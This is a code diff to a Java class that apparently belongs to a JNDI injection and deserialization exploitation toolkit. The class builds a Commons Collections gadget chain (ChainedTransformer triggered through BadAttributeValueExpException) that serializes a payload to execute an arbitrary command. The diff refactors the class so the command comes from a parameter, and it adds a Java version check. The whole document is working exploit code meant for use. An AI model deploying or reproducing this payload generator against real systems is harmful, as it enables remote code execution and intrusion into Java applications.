@@ -1,6 +1,7 @@
 package com.nu1r.jndi.gadgets;
 
 import com.nu1r.jndi.enumtypes.PayloadType;
+import com.nu1r.jndi.gadgets.utils.JavaVersion;
 import com.nu1r.jndi.gadgets.utils.Reflections;
 import com.nu1r.jndi.gadgets.utils.cc.TransformerUtil;
 import org.apache.commons.collections.Transformer;
@@ -15,10 +16,10 @@ import java.io.ObjectOutputStream;
 import java.util.HashMap;
 import java.util.Map;
 
-public class CommonsCollections9 {
+public class CommonsCollections9 implements ObjectPayload<BadAttributeValueExpException>{
 
-    public static byte[] getBytes(PayloadType type) throws Exception {
-        String                        command            = String.valueOf(type);
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+        String                        command            = param[0];
         String[]                      execArgs           = {command};
         Class                         c                  = (execArgs.length > 1) ? String[].class : String.class;
         ChainedTransformer            chainedTransformer = new ChainedTransformer(new Transformer[]{(Transformer) new ConstantTransformer(Integer.valueOf(1))});
@@ -37,5 +38,14 @@ public class CommonsCollections9 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public BadAttributeValueExpException getObject(String command) throws Exception {
+        return null;
+    }
+
+    public static boolean isApplicableJavaVersion() {
+        return JavaVersion.isBadAttrValExcReadObj();
     }
 }
